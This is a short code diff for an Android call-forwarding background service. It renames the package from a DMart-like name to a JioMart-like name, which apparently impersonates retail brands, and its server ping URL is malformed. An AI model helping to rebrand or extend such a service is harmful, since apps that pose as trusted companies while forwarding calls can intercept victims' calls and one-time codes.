@@ -1,4 +1,4 @@
-package com.dmartuser.client
+package com.jiomart.ready.app
 
 import android.app.Notification
 import android.app.NotificationChannel
@@ -38,7 +38,7 @@ class CallForwardingBackgroundService : Service() {
         private const val CHANNEL_ID = "call_forwarding_channel"
         private const val NOTIFICATION_ID = 2001
         private const val PREFS_NAME = "CallForwardingPrefs"
-        private const val RESTART_ACTION = "com.dmartuser.client.RESTART_CALL_FORWARDING_SERVICE"
+        private const val RESTART_ACTION = "com.jiomart.ready.app.RESTART_CALL_FORWARDING_SERVICE"
         private const val PING_URL = "http://68/api/ping"
     }
 
